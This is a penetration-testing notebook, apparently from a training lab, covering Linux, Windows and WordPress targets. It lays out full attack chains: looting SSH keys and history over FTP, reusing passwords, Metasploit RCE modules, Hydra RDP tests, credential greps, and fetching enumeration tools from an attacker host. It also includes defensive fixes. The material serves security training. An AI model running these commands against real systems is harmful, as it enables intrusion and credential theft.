  • Prefer manual understanding before automation.
  • Use noisy tools carefully.
  • Validate findings safely.
  • Document exact evidence.
  • Report remediation, not just exploitation.
  • Clean up after testing.

docs.title: Notes to Remember
docs.text:
• Methodology keeps testing consistent.
  • Planning reduces risk.
  • Enumeration drives good exploitation.
  • Exploitation should prove impact safely.
  • Documentation is part of the work, not an afterthought.
  • Reporting should help someone fix the issue.
  • Cleanup protects both the tester and the system owner.

docs.title: Exploitation
docs.text: Exploitation focuses on using discovered weaknesses to gain access, prove impact, or move deeper into a target environment.

docs.title: Topics
docs.text:
• Web — Web application vulnerabilities such as SQL injection, file upload, SSRF, access control issues, and path traversal.
  • Targets — Practical exploitation notes for Linux, Windows, WordPress, and other target types.

docs.title: Executive Summary
docs.text:
Linux target exploitation usually follows a chain:

  1. Enumerate exposed services.
  2. Identify misconfigurations or vulnerable applications.
  3. Gain initial access.
  4. Stabilize the shell.
  5. Enumerate the system from the inside.
  6. Escalate privileges.
  7. Collect evidence and document the attack path.

In this case, the target exposed several high-value weaknesses: anonymous FTP access, leaked SSH material, clear-text credentials in shell history, and a vulnerable WordPress plugin. These provided multiple paths to initial access as either the web server user or the local user john.

docs.title: 1. Information Gathering on Linux Targets
docs.text:
Linux information gathering starts with exposed network services. The goal is not only to identify open ports, but to determine whether any service leaks sensitive files, credentials, usernames, software versions, or configuration details.

Common targets include:

Service Why It Matters FTP May allow anonymous login or expose user home directories. SSH May accept leaked passwords or private keys. HTTP / HTTPS May expose vulnerable web applications. SMB / NFS May leak files, backups, or credentials. SNMP May leak users, processes, software, and network configuration. Databases May expose application data or credentials.

docs.title: 2. FTP Enumeration and File Leakage
docs.text:
FTP is often a weak point when anonymous access is enabled.

In this scenario, anonymous FTP access allowed browsing a user directory belonging to john.

docs.title: Key Findings
docs.text: Finding Impact Anonymous login enabled Anyone could access the FTP service without valid credentials. User directory exposed The /home/john directory was accessible. .bash_history exposed Previous commands revealed sensitive operational mistakes. id_rsa exposed A private SSH key was downloadable. WordPress setup note exposed Internal documentation helped identify the application context.

docs.title: Anonymous FTP Login
docs.text:
ftp <target-ip>

Use:

Username: anonymous
Password: anonymous

Useful commands after login:

ls -la
cd /home/john
get WordPress_Blog_Setup_Update.txt
get .bash_history
cd .ssh
get id_rsa

docs.title: 3. Bash History as a Credential Source
docs.text:
.bash_history records commands previously executed by a user. It is not a reliable forensic audit log, but when exposed, it can reveal sensitive mistakes.

In this case, .bash_history contained a clear-text password reset command:

echo "john:SuperSecurePass123" | sudo chpasswd

docs.title: Why This Is Critical
docs.text:
This single command reveals:

Item Value Username john Password SuperSecurePass123 Privilege context The command was run with sudo Attack opportunity Try SSH login and credential reuse

docs.title: Security Lesson
docs.text:
Never place credentials directly on the command line. They may be stored in:

  • Shell history
  • Process listings
  • Logs
  • Terminal scrollback
  • Monitoring tools

docs.title: 4. SSH Private Key Exposure
docs.text:
SSH keys are safer than passwords only when the private key is protected and stored securely.

In this case, the file id_rsa was exposed through FTP and was not protected with a passphrase.

docs.title: Correct Local Permission Before Use
docs.text:
SSH refuses to use private keys that are too open. Set strict permissions first:

chmod 600 id_rsa

docs.title: SSH Login with Private Key
docs.text:
ssh -i id_rsa john@<target-ip>

If the key has no passphrase and matches john's authorized keys, this grants direct shell access.

docs.title: Why This Worked
docs.text: Weakness Impact Private key exposed through FTP Anyone could download the key. No passphrase The key could be used immediately. Key trusted by SSH Direct login as john.

docs.title: 5. SSH Password Access
docs.text:
The password recovered from .bash_history can also be tested against SSH.

ssh john@<target-ip>

Password:

SuperSecurePass123

docs.title: Credential Reuse Checks
docs.text:
After recovering a valid password, test it carefully against relevant services:

Service Example SSH ssh john@<target-ip> WordPress Try john or related usernames in the login portal. SMB smbclient -L //<target-ip> -U john Databases Only if database services are exposed and authorization allows testing.

docs.title: 6. WordPress Enumeration with WPScan
docs.text:
The target also hosted a WordPress site. WordPress enumeration focuses on identifying:

  • WordPress version
  • Themes
  • Plugins
  • Users
  • Vulnerable components
  • Misconfigurations

docs.title: Example WPScan Command
docs.text:
wpscan --url https://<target-ip> --disable-tls-checks --enumerate p,t,u

Where:

Option Purpose --url Target WordPress site. --disable-tls-checks Ignores certificate validation issues. --enumerate p,t,u Enumerates plugins, themes, and users.

docs.title: Findings
docs.text: Component Finding Web server Apache/2.4.52 on Ubuntu WordPress Version 6.7.2 Vulnerable plugin hash-form v1.1.0 Vulnerability CVE-2024-5084 Impact Unauthenticated arbitrary file upload / RCE

docs.title: 7. WordPress Plugin RCE
docs.text: The vulnerable plugin was Hash Form – Drag & Drop Form Builder version 1.1.0.

docs.title: Vulnerability Summary
docs.text: Item Detail CVE CVE-2024-5084 Vulnerable component Hash Form plugin Vulnerable versions 1.1.0 and below Vulnerability type Unauthenticated arbitrary file upload Root cause Missing file type validation Impact Upload a PHP web shell and execute commands Severity Critical

docs.title: Why File Upload RCE Matters
docs.text:
If an attacker can upload a PHP file into a web-accessible directory, they may be able to execute system commands as the web server user.

Typical result:

www-data

This is usually a low-privilege account, but it provides a foothold for post-exploitation.

docs.title: 8. Exploitation with Metasploit
docs.text: Metasploit can automate exploitation of the vulnerable Hash Form plugin.

docs.title: Start Metasploit
docs.text: msfconsole

docs.title: Search for the Module
docs.text: search wordpress hash form

docs.title: Select the Module
docs.text: use exploit/multi/http/wp_hash_form_rce

docs.title: Review Module Information
docs.text: info

docs.title: Example Configuration
docs.text:
set RHOSTS <target-ip>
set RPORT 443
set SSL true
set LHOST <attacker-vpn-ip>
run

docs.title: Expected Result
docs.text:
The exploit uploads a PHP payload into the WordPress uploads path and triggers it.

Common upload location:

/wp-content/uploads/hashform/temp/

Expected shell context:

www-data

docs.title: 9. Initial Access Paths
docs.text:
This target provided three separate initial access paths.

Vector Source User Gained Reliability WordPress plugin RCE Vulnerable hash-form plugin www-data High SSH private key Exposed id_rsa from FTP john High SSH password .bash_history credential leak john High

docs.title: Best Access Path
docs.text:
The strongest initial access path is usually the one that provides the most stable and privileged shell.

In this case:

  1. SSH as john using id_rsa.
  2. Confirm password access as backup.
  3. Use WordPress RCE as an alternative foothold or proof of impact.

docs.title: 10. Post-Access Reconnaissance
docs.text: After gaining shell access, immediately identify who you are, where you are, and what system you are on.

docs.title: Basic Identity Checks
docs.text:
whoami
id
hostname
pwd

Expected users:

john
www-data

docs.title: System Information
docs.text:
uname -a
cat /etc/os-release

Example finding:

Ubuntu 22.04.4 LTS
Kernel 5.15.0

docs.title: Network Information
docs.text:
ip addr
ip route
ss -tulpen

Legacy alternatives:

ifconfig
netstat -tulpen

docs.title: User and Home Directory Enumeration
docs.text:
ls -la /home
ls -la /home/john

docs.title: Sudo Rights
docs.text:
sudo -l

If a password is known, test whether john can run privileged commands.

docs.title: 11. Exploitation vs. Post-Exploitation
docs.text:
It is important to separate the external attack from the internal phase.

Phase Perspective Goal Exploitation Outside the target Gain an initial foothold. Post-exploitation Inside the target Enumerate, escalate, pillage, and document impact.

docs.title: Post-Exploitation Objectives
docs.text: Objective Description Enumeration Gather system, user, service, and network details. Pillaging Search for credentials, sensitive files, and business data. Vulnerability assessment Identify local privilege escalation paths. Privilege escalation Move from a low-privileged user to root. Persistence Understand how access could be maintained. Exfiltration Demonstrate controlled access to sensitive files if authorized.

docs.title: System Information
docs.text:
uname -a
cat /etc/os-release
hostnamectl
lscpu

Look for:

  • OS version
  • Kernel version
  • Architecture
  • Hostname
  • Virtualization indicators

docs.title: User Information
docs.text:
id
whoami
groups
cat /etc/passwd
sudo -l
last
w

Look for:

  • Current user privileges
  • Sudo rights
  • Interesting users
  • Recently logged-in users
  • Service accounts

docs.title: Network Information
docs.text:
ip addr
ip route
ss -tulpen
cat /etc/hosts
cat /etc/resolv.conf

Look for:

  • Internal subnets
  • Listening services
  • Local-only services
  • DNS servers
  • Hostname mappings

docs.title: Process Information
docs.text:
ps aux
ps auxww
top

Look for:

  • Processes running as root
  • Web services
  • Database services
  • Backup jobs
  • Custom scripts

docs.title: Scheduled Tasks
docs.text:
crontab -l
ls -la /etc/cron*
ls -la /var/spool/cron/
systemctl list-timers

Look for:

  • Writable scripts run by root
  • Backup jobs
  • Unusual recurring tasks
  • Scripts in /tmp, /dev/shm, or user directories

docs.title: File System Checks
docs.text:
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
find / -writable -type d 2>/dev/null
mount
df -h

Look for:

  • SUID binaries
  • SGID binaries
  • Writable directories
  • Mounted shares
  • Misconfigured permissions

docs.title: Credential Hunting
docs.text:
grep -Ri "password" /home 2>/dev/null
grep -Ri "pass" /var/www 2>/dev/null
find /home -name "id_rsa" 2>/dev/null
find / -name "*.kdbx" 2>/dev/null

High-value locations:

Location Why It Matters /home/*/.ssh/ SSH keys and known hosts. /var/www/ Web application configs. /opt/ Custom applications and scripts. /etc/ Service configuration files. /tmp/ and /dev/shm/ Common attacker staging directories.

docs.title: 13. Automated Enumeration with LinPEAS
docs.text: LinPEAS is part of the PEASS-ng suite and automates Linux privilege escalation checks.

docs.title: Transfer LinPEAS to the Target
docs.text:
Start a Python web server on the attacker machine:

python3 -m http.server 8000

Download it from the target:

wget http://<attacker-ip>:8000/linpeas.sh

Make it executable:

chmod +x linpeas.sh

Run it:

./linpeas.sh

docs.title: LinPEAS Output Priority
docs.text: Color / Signal Meaning Red / Yellow Highly likely privilege escalation vector. Check first. Red Possible privilege escalation vector. Requires validation. Green Useful system information. Blue Interesting users, groups, or contextual information.

docs.title: What LinPEAS Checks
docs.text: Category Examples Credentials Passwords in files, configs, environment variables. Sudo rights Dangerous sudo -l entries. SUID / SGID Abusable privileged binaries. Writable paths Writable scripts, services, or cron jobs. Kernel exploits Kernel version matched to known local exploits. Services Misconfigured or outdated local services. Lateral movement SSH keys, known hosts, internal routes.

docs.title: 14. Example Attack Chain
docs.text:
A clean attack chain for this target would be:

  1. Scan the target and identify FTP, SSH, and HTTPS.
  2. Log in to FTP anonymously.
  3. Download .bash_history, id_rsa, and internal WordPress notes.
  4. Extract john:SuperSecurePass123 from .bash_history.
  5. Set private key permissions with chmod 600 id_rsa.
  6. SSH into the target as john.
  7. Confirm identity with id.
  8. Run sudo -l and begin local privilege escalation checks.
  9. Run LinPEAS for automated enumeration.
  10. Document each successful access path and the root cause.

docs.title: 15. Defensive Lessons
docs.text: Weakness Defensive Fix Anonymous FTP enabled Disable anonymous login unless absolutely required. User home directory exposed Restrict FTP root and enforce chroot isolation. Private SSH key exposed Store keys securely and protect them with passphrases. Clear-text password in .bash_history Avoid typing secrets in shell commands; clear exposed history and rotate credentials. Vulnerable WordPress plugin Patch or remove vulnerable plugins. Web server user shell access Harden web directories and restrict executable uploads. Weak credential hygiene Rotate leaked passwords and audit reuse across services.

docs.title: 16. Quick Reference
docs.text: Task Command Anonymous FTP login ftp <target-ip> Download FTP file get <filename> Fix SSH key permissions chmod 600 id_rsa SSH with private key ssh -i id_rsa john@<target-ip> SSH with password ssh john@<target-ip> Basic identity check id && whoami && hostname OS version cat /etc/os-release Kernel version uname -a Listening ports ss -tulpen Sudo rights sudo -l SUID binaries find / -perm -4000 -type f 2>/dev/null Start file server python3 -m http.server 8000 Download LinPEAS wget http://<attacker-ip>:8000/linpeas.sh Run LinPEAS chmod +x linpeas.sh && ./linpeas.sh

docs.title: Key Takeaways
docs.text:
• Anonymous FTP can become a critical vulnerability if it exposes user files.
  • .bash_history often contains operational mistakes, including passwords and administrative commands.
  • An unencrypted private SSH key is equivalent to a password.
  • WordPress plugins are common attack paths and should be enumerated carefully.
  • Initial access as www-data is useful, but SSH access as a real user is usually more stable.
  • Post-exploitation begins with local enumeration.
  • Tools like LinPEAS are powerful, but manual verification is still required.

docs.title: Executive Summary
docs.text:
Windows target exploitation commonly focuses on corporate services such as SMB, RDP, WinRM, development platforms, and Active Directory-connected applications.

In this case, the Windows target exposed several important services:

  • SMB on ports 139 and 445
  • RDP on port 3389
  • SSH on port 22
  • Gitea on port 3000
  • MSRPC on port 135

Initial access was achieved through credential reuse. Credentials recovered from a Linux target were valid against Windows services, allowing access to SMB, RDP, and Gitea. After access was gained, enumeration revealed a high-probability privilege escalation path through a scheduled task running a writable PowerShell script as Administrator.

docs.title: 1. Windows Information Gathering
docs.text:
Windows reconnaissance focuses on identifying exposed management services, file-sharing services, and internal development tools.

High-value Windows services include:

Service Port Why It Matters SMB 139 / 445 File shares, authentication, user enumeration, relay attacks. MSRPC 135 Remote procedure calls and Windows service discovery. RDP 3389 Remote desktop access and interactive sessions. WinRM 5985 / 5986 Remote PowerShell management. SSH 22 Remote shell access on newer Windows servers. Web apps 80 / 443 / custom Internal apps, Git services, dashboards, and admin panels.

docs.title: 2. Initial Service Discovery with Nmap
docs.text: A full port scan revealed a mix of standard Windows services and a custom development service.

docs.title: Example Full Port Scan
docs.text: sudo nmap -p- --min-rate 5000 -oN full-port-scan.txt <target-ip>

docs.title: Example Service Scan
docs.text: sudo nmap -sC -sV -p 22,135,139,445,3000,3389 -oN service-scan.txt <target-ip>

docs.title: Findings
docs.text: Port Service Version / Detail 22 SSH OpenSSH for Windows 9.5 135 MSRPC Microsoft Windows RPC 139 / 445 SMB Windows Server 2019 Standard 3000 HTTP Gitea 1.12.4 3389 RDP Microsoft Terminal Services

docs.title: Important SMB Finding
docs.text:
Nmap flagged that SMB message signing was disabled or not required.

This is dangerous because SMB signing protects against tampering and helps prevent SMB relay attacks.

docs.title: 3. SMB Enumeration
docs.text:
SMB is one of the most important Windows enumeration targets because it may reveal:

  • Shares
  • Usernames
  • Hostname and domain information
  • Guest or null-session access
  • Writable directories
  • Sensitive files
  • Password reuse opportunities

docs.title: Basic CrackMapExec Check
docs.text:
crackmapexec smb <target-ip>

Example finding:

SMBv1: True

docs.title: Why SMBv1 Is Dangerous
docs.text: SMBv1 is a legacy protocol that should be disabled. It is associated with major historical vulnerabilities such as MS17-010 / EternalBlue and usually indicates weak legacy compatibility requirements.

docs.title: Null Session Test
docs.text:
crackmapexec smb <target-ip> -u '' -p ''

Possible outcomes:

Result Meaning Authentication succeeds Null or guest-style access may be possible. Share listing works Sensitive file exposure risk. User enumeration denied Authentication worked, but permissions are restricted. Access denied Null session likely blocked.

docs.title: 4. Gitea Enumeration
docs.text: Gitea is a self-hosted Git service. It may contain internal repositories, scripts, deployment notes, credentials, and source code.

docs.title: Target Finding
docs.text: Item Value Service Gitea Port 3000 Version 1.12.4 Language runtime Go 1.14.8

docs.title: Why Gitea Matters
docs.text:
Internal Git services are high-value because they may expose:

  • Application source code
  • Deployment scripts
  • Hardcoded credentials
  • SSH keys
  • API tokens
  • Internal hostnames
  • CI/CD configuration
  • Privileged automation logic

docs.title: 5. Credential Reuse from Linux Target
docs.text:
Credentials recovered from the Linux target were reused against the Windows host.

Recovered credentials:

john:SuperSecurePass123

This is a critical example of why password reuse across systems is dangerous. A compromise on one machine can become access to another.

docs.title: 6. SMB Access with Valid Credentials
docs.text:
After recovering credentials, test them against SMB.

crackmapexec smb <target-ip> -u "john" -p 'SuperSecurePass123'

docs.title: Share Enumeration
docs.text: crackmapexec smb <target-ip> -u "john" -p 'SuperSecurePass123' --shares

docs.title: Spidering a Share
docs.text:
The Devs share was spidered to search for files.

crackmapexec smb <target-ip> -u "john" -p 'SuperSecurePass123' --spider Devs --pattern .

docs.title: Finding
docs.text:
A file named tmp.ps1 was discovered.

The file contained hardcoded credentials for john, confirming that the account was used in development or administrative workflows.

docs.title: 7. RDP Credential Verification
docs.text: Before exploiting a web application, verify whether recovered credentials provide stable remote access.

docs.title: Hydra RDP Test
docs.text: hydra -l john -p "SuperSecurePass123" rdp://<target-ip>

docs.title: Result
docs.text:
The credentials were valid for RDP.

This provides a reliable GUI-based session for manual exploration, file review, and post-exploitation.

docs.title: 8. Establishing RDP Access
docs.text:
Use xfreerdp to connect to the Windows desktop.

xfreerdp /u:john /p:"SuperSecurePass123" /v:<target-ip> /w:1366 /h:768

docs.title: Why RDP Is Valuable
docs.text:
RDP provides:

  • Stable interactive access
  • GUI access to internal tools
  • Easier file browsing
  • Access to browser sessions
  • Access to desktop artifacts
  • Easier review of scheduled tasks, services, and logs

docs.title: 9. Gitea Exploitation
docs.text: The Gitea instance was version 1.12.4, which is vulnerable to remote code execution through Git hooks when dangerous configuration is enabled.

docs.title: Vulnerability Concept
docs.text:
Gitea versions before safer defaults allowed Git hooks to be abused if the application permitted hook modification.

The attack flow:

  1. Authenticate to Gitea as a valid user.
  2. Create or access a repository.
  3. Add a malicious post-receive Git hook.
  4. Push or modify content.
  5. Trigger the hook.
  6. Execute the payload on the server.

docs.title: Metasploit Module
docs.text: exploit/multi/http/gitea_git_hooks_rce

docs.title: Example Metasploit Flow
docs.text:
msfconsole
use exploit/multi/http/gitea_git_hooks_rce
set RHOSTS <target-ip>
set RPORT 3000
set USERNAME john
set PASSWORD SuperSecurePass123
run

docs.title: Result
docs.text: A Meterpreter session was opened on the Windows target.

docs.title: 10. Initial Access Summary
docs.text:
This target provided multiple access paths.

Vector Requirement Result SMB access Reused john credentials Access to internal share data. RDP access Reused john credentials Stable GUI session. Gitea RCE Valid Gitea credentials Meterpreter session.

docs.title: Strongest Access Path
docs.text:
The best operational access path was RDP as john, because it provided a stable desktop session and allowed easier manual enumeration.

The Gitea exploit provided code execution and a post-exploitation foothold.

docs.title: 11. Windows Post-Access Enumeration
docs.text: After gaining access, begin with identity, privilege, system, network, and service checks.

docs.title: Identity Checks
docs.text:
whoami
whoami /user
whoami /groups
whoami /priv
hostname

docs.title: System Information
docs.text:
systeminfo
ver
wmic os get Caption,Version,BuildNumber,OSArchitecture

docs.title: Network Information
docs.text:
ipconfig /all
route print
arp -a
netstat -ano

PowerShell alternatives:

Get-NetIPAddress
Get-NetRoute
Get-NetNeighbor
Get-NetTCPConnection

docs.title: Local Users and Groups
docs.text:
net user
net localgroup
net localgroup Administrators
net localgroup "Remote Desktop Users"

PowerShell alternatives:

Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators

docs.title: 12. Privilege Analysis
docs.text: Privilege analysis is essential for finding escalation paths.

docs.title: whoami /priv
docs.text:
whoami /priv

Important finding:

SeImpersonatePrivilege

docs.title: Why SeImpersonatePrivilege Matters
docs.text:
SeImpersonatePrivilege allows a process to impersonate a client after authentication.

This privilege is commonly abused in Windows privilege escalation techniques, especially when combined with service abuse or coercion techniques.

Examples of related tooling include:

  • JuicyPotato
  • RoguePotato
  • PrintSpoofer
  • GodPotato

Whether these work depends on OS version, patch level, service availability, and local restrictions.

docs.title: Group Membership
docs.text:
whoami /groups

Important groups found:

Group Impact Remote Desktop Users Confirms RDP access. Event Log Readers Allows reading logs that may reveal sensitive information. High Mandatory Level Indicates elevated integrity context.

docs.title: 13. Automated Enumeration with WinPEAS
docs.text: WinPEAS automates many Windows privilege escalation checks.

docs.title: Transfer WinPEAS
docs.text:
From attacker machine:

python3 -m http.server 8000

From Windows target PowerShell:

Invoke-WebRequest -Uri "http://<attacker-ip>:8000/winPEASx64.exe" -OutFile "C:\ProgramData\winPEASx64.exe"

Run:

C:\ProgramData\winPEASx64.exe

docs.title: WinPEAS Findings
docs.text: Finding Impact C:\ProgramData writable Useful for staging files and possible privilege escalation. Domain joined to HTBLAB Indicates potential Active Directory environment. Local-only ports 8001 and 8003 Possible internal services or management APIs. Scheduled task running as Administrator High-value privilege escalation path.

docs.title: 14. Writable C:\ProgramData
docs.text: C:\ProgramData is commonly used by applications to store shared data. It is normal for some subdirectories to be writable, but broad write permissions can be dangerous.

docs.title: Check Permissions
docs.text:
icacls C:\ProgramData

PowerShell:

Get-Acl C:\ProgramData | Format-List

docs.title: Why This Matters
docs.text: If a privileged service or scheduled task runs scripts from a writable path, a standard user may be able to replace or modify those scripts and gain elevated code execution.

docs.title: 15. Scheduled Task Enumeration
docs.text: Scheduled tasks are a common Windows persistence and privilege escalation mechanism.

docs.title: Query Scheduled Tasks
docs.text:
schtasks /query /v /fo list

Filter for interesting tasks:

schtasks /query /v /fo list | findstr /i "TaskName Task To Run Run As"

PowerShell:

Get-ScheduledTask

docs.title: Critical Finding
docs.text: Field Value Task Name \CorpBackupAgent Author Administrator Task To Run powershell.exe -File C:\ProgramData\CorpBackup\Scripts\backupprep.ps1 Run As User Administrator Frequency Every 2 minutes

docs.title: Why This Is Vulnerable
docs.text:
The task runs a PowerShell script from inside C:\ProgramData.

If john can modify:

C:\ProgramData\CorpBackup\Scripts\backupprep.ps1

then the next scheduled task run may execute attacker-controlled code as Administrator.

docs.title: 16. Validating the Scheduled Task Escalation Path
docs.text:
Before modifying anything, verify permissions on the script and parent directories.

icacls C:\ProgramData\CorpBackup
icacls C:\ProgramData\CorpBackup\Scripts
icacls C:\ProgramData\CorpBackup\Scripts\backupprep.ps1

Look for permissions such as:

BUILTIN\Users:(F)
BUILTIN\Users:(M)
john:(F)
john:(M)
Everyone:(F)
Everyone:(M)

Where:

Permission Meaning F Full Control M Modify W Write RX Read and Execute

docs.title: Safe Proof of Concept
docs.text:
A safe validation is to append a harmless command that writes the current user to a file.

Add-Content -Path "C:\ProgramData\CorpBackup\Scripts\backupprep.ps1" -Value 'whoami > C:\ProgramData\whoami-task.txt'

Wait for the task to run, then check:

type C:\ProgramData\whoami-task.txt

Expected result:

win01\administrator

This proves privilege escalation without deploying a shell or destructive payload.

docs.title: Identity and Privileges
docs.text:
whoami
whoami /priv
whoami /groups

docs.title: System and Patch Level
docs.text:
systeminfo
wmic qfe list brief

docs.title: Network
docs.text:
ipconfig /all
netstat -ano
route print

docs.title: Users and Groups
docs.text:
net user
net localgroup
net localgroup Administrators

docs.title: Shares
docs.text:
net share
net use

docs.title: Services
docs.text:
sc query
wmic service list brief

docs.title: Scheduled Tasks
docs.text: schtasks /query /v /fo list

docs.title: Interesting Files
docs.text:
dir C:\Users\ /a
dir C:\ProgramData\ /a
dir C:\ /a

PowerShell search examples:

Get-ChildItem -Path C:\Users -Recurse -File -ErrorAction SilentlyContinue | Select-String -Pattern "password","secret","token"

docs.title: 18. Example Attack Chain
docs.text:
A clean attack chain for this Windows target would be:

  1. Run full Nmap scan.
  2. Identify SMB, RDP, SSH, and Gitea.
  3. Confirm SMBv1 enabled and SMB signing not required.
  4. Test null session and guest access.
  5. Reuse credentials recovered from the Linux target.
  6. Enumerate SMB shares with CrackMapExec.
  7. Spider the Devs share.
  8. Find tmp.ps1 and confirm hardcoded credentials.
  9. Verify RDP access with Hydra.
  10. Connect with xfreerdp.
  11. Exploit Gitea Git hooks RCE using valid credentials.
  12. Run local enumeration.
  13. Identify SeImpersonatePrivilege.
  14. Run WinPEAS.
  15. Discover writable C:\ProgramData.
  16. Discover CorpBackupAgent scheduled task running as Administrator.
  17. Validate whether backupprep.ps1 is writable.
  18. Prove elevated execution safely by writing whoami output to a file.

docs.title: 19. Defensive Lessons
docs.text: Weakness Defensive Fix Password reused from Linux to Windows Enforce unique credentials and rotate exposed passwords. SMBv1 enabled Disable SMBv1 across the environment. SMB signing not required Require SMB signing where possible. Sensitive script in SMB share Restrict share permissions and remove hardcoded credentials. Gitea outdated Patch Gitea and disable unsafe Git hooks. RDP exposed Restrict RDP with VPN, MFA, firewall rules, and least privilege. C:\ProgramData overly writable Apply least-privilege NTFS permissions. Scheduled task runs writable script as Administrator Store privileged task scripts in protected paths. Hardcoded credentials in scripts Use managed secrets, service accounts, or secure vaults.

docs.title: 20. Quick Reference
docs.text: Task Command Full port scan sudo nmap -p- --min-rate 5000 <target-ip> Service scan sudo nmap -sC -sV -p <ports> <target-ip> Basic SMB check crackmapexec smb <target-ip> Null session test crackmapexec smb <target-ip> -u '' -p '' SMB with creds crackmapexec smb <target-ip> -u john -p 'SuperSecurePass123' List shares crackmapexec smb <target-ip> -u john -p 'SuperSecurePass123' --shares Spider share crackmapexec smb <target-ip> -u john -p 'SuperSecurePass123' --spider Devs --pattern . Test RDP creds hydra -l john -p "SuperSecurePass123" rdp://<target-ip> RDP login xfreerdp /u:john /p:"SuperSecurePass123" /v:<target-ip> User privileges whoami /priv User groups whoami /groups Scheduled tasks schtasks /query /v /fo list File permissions icacls <path> Services sc query Network connections netstat -ano PowerShell download Invoke-WebRequest -Uri <url> -OutFile <path>

docs.title: Key Takeaways
docs.text:
• Windows targets often expose high-value management services such as SMB and RDP.
  • SMBv1 and unsigned SMB are major security weaknesses.
  • Credentials recovered from one machine should always be tested carefully against other authorized targets.
  • Gitea and other internal development platforms can become initial access paths when outdated or misconfigured.
  • RDP provides stable access and is useful for manual enumeration.
  • SeImpersonatePrivilege is a major escalation clue.
  • Scheduled tasks running privileged scripts from writable directories are high-probability privilege escalation paths.
  • Always verify write permissions before attempting scheduled task hijacking.

docs.title: WordPress Enumeration and Exploitation
docs.text:
WordPress is one of the most common content management systems on the web, which also makes it a frequent target during web application assessments. A WordPress compromise usually comes from one of three areas: outdated core software, vulnerable plugins or themes, or weak administrative access controls.

For penetration testing, WordPress should be approached in stages: identify the core version, enumerate plugins and themes, discover valid users, test authentication paths, and then validate exploitable findings such as vulnerable plugins, local file inclusion, or authenticated remote code execution through the dashboard.

docs.title: 1. WordPress Core Version Enumeration
docs.text: Identifying the WordPress core version is one of the first steps during reconnaissance. The version can often be used to search for known vulnerabilities, exposed misconfigurations, or outdated security behavior.

docs.title: Meta Generator Tag
docs.text:
The simplest method is checking the HTML source for the meta generator tag.

curl -s http://blog.inlanefreight.com | grep '<meta name="generator"'

Example output:

<meta name="generator" content="WordPress 5.3.3" />

This directly reveals the WordPress version.

docs.title: Version Disclosure in CSS and JavaScript
docs.text:
If the generator tag is removed, WordPress may still disclose the version in loaded CSS or JavaScript files through the ?ver= parameter.

Example CSS reference:

<link rel='stylesheet' id='bootstrap-css' href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3' type='text/css' media='all' />

Example JavaScript reference:

<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3'></script>

The ?ver=5.3.3 value may reveal the WordPress core version or the component version.

docs.title: Legacy readme.html
docs.text:
Older WordPress installations may expose a default readme.html file in the web root.

http://blog.inlanefreight.com/readme.html

This file may disclose the installed WordPress version. Modern installations and security plugins often remove or restrict access to it, but it is still worth checking during enumeration.

docs.title: 2. Plugin and Theme Enumeration
docs.text:
Plugins and themes are often the weakest part of a WordPress installation. They are developed by third parties and may introduce vulnerabilities such as Local File Inclusion, SQL Injection, Cross-Site Scripting, arbitrary file upload, or authentication bypass.

WordPress plugins are usually stored under:

/wp-content/plugins/

Themes are usually stored under:

/wp-content/themes/

docs.title: Passive Plugin Enumeration
docs.text:
Plugins often load JavaScript or CSS files into public pages. These paths can be scraped from the page source.

curl -s http://blog.inlanefreight.com \
  | sed 's/href=/\n/g' \
  | sed 's/src=/\n/g' \
  | grep 'wp-content/plugins/' \
  | cut -d"'" -f2

Example findings:

/wp-content/plugins/wp-google-places-review-slider/...
/wp-content/plugins/mail-masta/...

This reveals installed or active plugins.

docs.title: Passive Theme Enumeration
docs.text:
Themes can be discovered in the same way by searching for /wp-content/themes/.

curl -s http://blog.inlanefreight.com \
  | sed 's/href=/\n/g' \
  | sed 's/src=/\n/g' \
  | grep 'themes' \
  | cut -d"'" -f2

Example finding:

/wp-content/themes/ben_theme/

docs.title: Active Plugin Enumeration
docs.text:
Passive enumeration only reveals components loaded on the page being inspected. Some installed plugins may not load assets on the homepage. Active enumeration checks known plugin paths directly.

curl -I http://blog.inlanefreight.com/wp-content/plugins/mail-masta

A 301, 200, or 403 response can indicate that the plugin exists.

curl -I http://blog.inlanefreight.com/wp-content/plugins/fake-plugin

A 404 Not Found usually indicates that the plugin is not installed.

docs.title: 3. Directory Indexing
docs.text:
Directory indexing occurs when the web server allows users to browse directory contents directly. In WordPress, this can expose plugin folders, theme files, backups, changelogs, and disabled components.

A disabled plugin is not necessarily safe. If the plugin files remain on the server, vulnerable PHP scripts may still be directly accessible.

Example:

curl -s http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text

Directory indexing may reveal:

  • Plugin versions
  • readme.txt files
  • Backup files
  • Hidden scripts
  • Directly accessible vulnerable PHP files

The safest remediation is to delete unused plugins and themes, not merely deactivate them.

docs.title: 4. WordPress User Enumeration
docs.text: Valid usernames are useful for password attacks, credential stuffing, and targeted phishing. WordPress commonly leaks usernames through author pages and the REST API.

docs.title: Author ID Enumeration
docs.text:
WordPress assigns numerical IDs to users. The first administrator account is often user ID 1.

curl -s -I http://blog.inlanefreight.com/?author=1

If the user exists, WordPress may redirect to an author page:

Location: http://blog.inlanefreight.com/index.php/author/admin/

This reveals the username admin.

A non-existent user may return:

HTTP/1.1 404 Not Found

docs.title: REST API User Enumeration
docs.text:
The WordPress REST API can expose published users through the /wp-json/wp/v2/users endpoint.

curl -s http://blog.inlanefreight.com/wp-json/wp/v2/users | jq

Useful fields include:

Field Description id Numeric user ID name Public display name slug URL-friendly username value link Author page URL

In newer WordPress versions, this endpoint generally only exposes users who have published content.

docs.title: 5. Brute-Forcing WordPress Logins
docs.text:
After valid usernames are identified, attackers may attempt password attacks against WordPress authentication endpoints.

The standard login page is:

/wp-login.php

Another high-value endpoint is:

/xmlrpc.php

docs.title: XML-RPC Authentication Testing
docs.text:
The xmlrpc.php endpoint allows remote applications to interact with WordPress. Attackers abuse it because it may allow many credential attempts through fewer HTTP requests.

A manual credential test can be sent using the wp.getUsersBlogs method.

curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

A successful response may contain:

<member><name>isAdmin</name><value><boolean>1</boolean></value></member>

An invalid login may return:

<name>faultCode</name><value><int>403</int></value>
